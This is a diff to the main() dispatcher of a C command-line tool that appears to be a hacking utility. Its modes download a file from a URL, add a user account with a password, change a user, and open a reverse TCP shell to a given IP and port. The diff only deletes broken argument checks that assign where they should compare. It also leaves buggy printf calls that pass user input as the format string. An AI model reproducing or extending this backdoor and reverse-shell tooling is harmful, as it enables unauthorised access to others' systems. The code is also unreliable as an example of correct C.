@@ -203,10 +203,6 @@ int main(int argc, char* argv[])
 		exit(1);
 	}
 	else if (strcmp(argv[1],"-d")==0){
-		if(argv[2]=""){
-			printf("Please enter url");
-			exit(1);
-		}
 		download(c2wc(argv[2]),c2wc(argv[3]));
 		printf("%s""download ok");
 		exit(0);
@@ -214,14 +210,8 @@ int main(int argc, char* argv[])
 
 	else if(strcmp(argv[1],"-u")==0)
 	{
-		if(argv[2]=""){
-			printf("Please enter user");
-			exit(1);
-		}
-		else if(argv[3]=""){
-			printf("Please enter pass");
-			exit(1);
-		}
+
+
 		printf("add user %s%s",argv[2],"\n");
 		printf("add pass %s", argv[3],"\n");
 		apiAdd(c2wc(argv[2]), c2wc(argv[3]));
@@ -230,24 +220,14 @@ int main(int argc, char* argv[])
 
 	else if(strcmp(argv[1], "-s")==0)
 	{
-		if(argv[2]=""){
-			printf("Please enter user");
-			exit(1);
-		}
+
 		OnBnClickedChange(argv[2]);
 		exit(0);
 	}
 
 	else if(strcmp(argv[1],"-r")==0)
 	{
-		if(argv[2]=""){
-			printf("Please enter ip");
-			exit(1);
-		}
-		else if(argv[3]=""){
-			printf("Please enter port");
-			exit(1);
-		}
+
 		printf(argv[2],"\n");
 		printf(argv[3],"\n");
 		reverse_tcp(argv[2], atoi(argv[3]));
